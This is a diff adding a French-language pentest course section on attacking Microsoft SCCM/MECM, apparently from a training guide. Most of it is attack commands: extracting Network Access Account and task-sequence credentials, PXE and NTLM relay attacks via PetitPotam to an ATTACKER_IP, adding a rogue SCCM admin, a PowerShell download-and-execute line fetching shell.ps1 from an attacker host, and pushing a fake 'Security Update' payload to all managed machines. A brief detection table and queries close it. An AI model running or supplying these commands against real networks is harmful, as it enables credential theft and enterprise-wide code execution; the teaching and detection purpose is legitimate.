@@ -780,6 +780,239 @@ gpupdate /force
 
 ---
 
+## 7. SCCM / MECM Exploitation
+
+Microsoft Endpoint Configuration Manager (anciennement SCCM) est une cible prioritaire en environnement entreprise. Sa compromission permet souvent d'obtenir des credentials privilégiés ou d'exécuter du code sur toutes les machines gérées.
+
+### 7.1 Architecture SCCM
+
+```mermaid
+flowchart TB
+    subgraph hierarchy["SCCM Hierarchy"]
+        CAS[Central Admin Site]
+        PS1[Primary Site 1]
+        PS2[Primary Site 2]
+        DP1[Distribution Point 1]
+        DP2[Distribution Point 2]
+        MP[Management Point]
+    end
+
+    subgraph clients["Managed Clients"]
+        C1[Workstation 1]
+        C2[Workstation 2]
+        C3[Server 1]
+    end
+
+    CAS --> PS1
+    CAS --> PS2
+    PS1 --> DP1
+    PS1 --> MP
+    PS2 --> DP2
+
+    MP -->|"Policy & Inventory"| C1
+    MP -->|"Policy & Inventory"| C2
+    MP -->|"Policy & Inventory"| C3
+    DP1 -->|"Software/Scripts"| C1
+    DP1 -->|"Software/Scripts"| C2
+
+    style CAS fill:#e74c3c,color:#fff
+    style MP fill:#f39c12,color:#fff
+```
+
+**Composants critiques :**
+
+| Composant | Rôle | Risque si compromis |
+|-----------|------|---------------------|
+| **Site Server** | Serveur principal SCCM | Contrôle total de l'infrastructure |
+| **Site Database** | Base SQL contenant tout | Credentials, inventaire complet |
+| **Management Point** | Interface client/serveur | MitM, policy injection |
+| **Distribution Point** | Distribution de contenu | Package tampering |
+| **NAA (Network Access Account)** | Compte pour accès anonyme | Souvent sur-privilégié |
+
+### 7.2 Énumération SCCM
+
+**Identifier les serveurs SCCM :**
+
+```powershell
+# Via DNS (SRV records)
+nslookup -type=srv _mssms_mp_.yourcompany.local
+
+# Via LDAP (System Management Container)
+Get-ADObject -Filter {objectClass -eq "mSSMSManagementPoint"} -SearchBase "CN=System Management,CN=System,DC=yourcompany,DC=local"
+
+# Via Registry (sur un client SCCM)
+reg query "HKLM\SOFTWARE\Microsoft\CCM" /s
+
+# Identifier le site code et MP
+Get-WmiObject -Namespace "root\ccm" -Class SMS_Authority
+```
+
+**Avec SharpSCCM :**
+
+```powershell
+# Énumération complète
+.\SharpSCCM.exe local site-info
+.\SharpSCCM.exe local client-info
+
+# Lister les Management Points
+.\SharpSCCM.exe get management-points
+
+# Lister les Distribution Points
+.\SharpSCCM.exe get distribution-points
+
+# Énumérer les collections
+.\SharpSCCM.exe get collections
+
+# Voir les déploiements
+.\SharpSCCM.exe get deployments
+```
+
+### 7.3 Credentials SCCM
+
+**Network Access Account (NAA) :**
+
+Le NAA est stocké sur les clients et peut être déchiffré avec DPAPI :
+
+```powershell
+# Extraire le NAA avec SharpSCCM (sur un client SCCM)
+.\SharpSCCM.exe local naa
+
+# Ou avec SharpDPAPI
+.\SharpDPAPI.exe sccm
+
+# Résultat : Username et Password du NAA en clair!
+```
+
+!!! danger "NAA Over-privileged"
+    Le NAA est souvent configuré avec des droits excessifs (Domain Admin dans les pires cas). Vérifiez toujours ses permissions après extraction.
+
+**Task Sequence Credentials :**
+
+Les Task Sequences peuvent contenir des credentials en clair ou obfusqués :
+
+```powershell
+# Lister les Task Sequences
+.\SharpSCCM.exe get task-sequences
+
+# Extraire les secrets des TS
+.\SharpSCCM.exe get secrets
+
+# Collection Variable secrets
+.\SharpSCCM.exe get collection-variables
+```
+
+**Credentials dans la base SQL :**
+
+```sql
+-- Sur le serveur SQL SCCM (requiert accès DB)
+-- Credentials Task Sequence
+SELECT * FROM SC_TaskSequence_Step WHERE TSStepName LIKE '%password%'
+
+-- Network Access Account (chiffré)
+SELECT * FROM SC_SiteDefinition WHERE SiteDef LIKE '%NetworkAccessAccount%'
+
+-- Collection Variables
+SELECT * FROM dbo.CollectionSettings WHERE CollectionID IN (
+    SELECT CollectionID FROM dbo.Collection_Settings_Variables
+)
+```
+
+### 7.4 Attaques SCCM
+
+**PXE Boot Attack :**
+
+Si le PXE n'est pas sécurisé, on peut intercepter/modifier les boot images :
+
+```bash
+# Avec PXEThief
+python3 pxethief.py -i eth0
+
+# Décoder le mot de passe PXE capturé
+python3 pxethief.py -d CAPTURED_MEDIA_KEY
+```
+
+**SCCM Relay Attack :**
+
+Relayer l'authentification NTLM du client vers le Management Point :
+
+```bash
+# Configurer le relay vers le site server
+ntlmrelayx.py -t https://sccm-server.yourcompany.local/AdminService/wmi/SMS_Admin -smb2support
+
+# Coercer une machine avec PetitPotam/PrinterBug
+python3 PetitPotam.py ATTACKER_IP target.yourcompany.local
+```
+
+**Hierarchy Takeover (YOURCOMPANYTAKEOVER) :**
+
+Si vous avez admin sur un Site Server, vous pouvez compromettre toute la hiérarchie :
+
+```powershell
+# Avec SharpSCCM (depuis un site compromis)
+# Ajouter un admin SCCM
+.\SharpSCCM.exe admin add-admin --user YOURCOMPANY\attacker --scope "All Systems"
+
+# Exécuter une application sur une collection
+.\SharpSCCM.exe exec -d TARGET-PC -p "C:\Windows\System32\cmd.exe" -a "/c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
+```
+
+### 7.5 Post-Exploitation SCCM
+
+**Déploiement de payload sur toutes les machines :**
+
+```powershell
+# Créer une application malveillante
+.\SharpSCCM.exe exec -d ALL-WORKSTATIONS -p "powershell.exe" -r
+
+# Ou via PowerShell natif (avec droits admin SCCM)
+$Application = New-CMApplication -Name "Security Update"
+$DeploymentType = Add-CMScriptDeploymentType -ApplicationName "Security Update" -DeploymentTypeName "Script" -InstallCommand "powershell.exe -ep bypass -f \\attacker\share\payload.ps1"
+Start-CMContentDistribution -ApplicationName "Security Update" -DistributionPointName "DP01.yourcompany.local"
+New-CMApplicationDeployment -ApplicationName "Security Update" -CollectionName "All Desktop and Server Clients"
+```
+
+**Extraction d'inventaire :**
+
+```sql
+-- Tous les comptes locaux admin (depuis SQL)
+SELECT DISTINCT
+    v.Name0 AS ComputerName,
+    lg.Name0 AS LocalAdmin
+FROM v_R_System v
+JOIN v_GS_LOCAL_GROUP_MEMBER lgm ON v.ResourceID = lgm.ResourceID
+JOIN v_RA_System_ResourceNames lg ON lgm.Domain0 + '\' + lgm.Name0 = lg.Name0
+WHERE lgm.Type0 = 2
+```
+
+### 7.6 Outils SCCM
+
+| Outil | Description |
+|-------|-------------|
+| **SharpSCCM** | Swiss army knife pour SCCM |
+| **SCCMHunter** | Énumération et exploitation |
+| **PXEThief** | Attaque PXE boot |
+| **MalSCCM** | Scripts d'exploitation SCCM |
+| **CMPivot** | Query intégré Microsoft (si accès console) |
+
+### 7.7 Détection SCCM Attacks
+
+| Attaque | Indicateurs |
+|---------|-------------|
+| NAA Extraction | Accès WMI root\ccm\policy |
+| PXE Attack | Trafic TFTP inhabituel |
+| Hierarchy Takeover | Nouveaux admins SCCM |
+| Malicious Deployment | Déploiements non planifiés |
+
+```powershell
+# Monitorer les admins SCCM
+Get-CMAdministrativeUser | Where-Object {$_.CreatedDate -gt (Get-Date).AddDays(-7)}
+
+# Auditer les déploiements récents
+Get-CMDeployment | Where-Object {$_.CreationTime -gt (Get-Date).AddDays(-1)}
+```
+
+---
+
 ## Exercice Pratique
 
 !!! example "Exercice : Escalade vers SYSTEM via 4 Techniques"
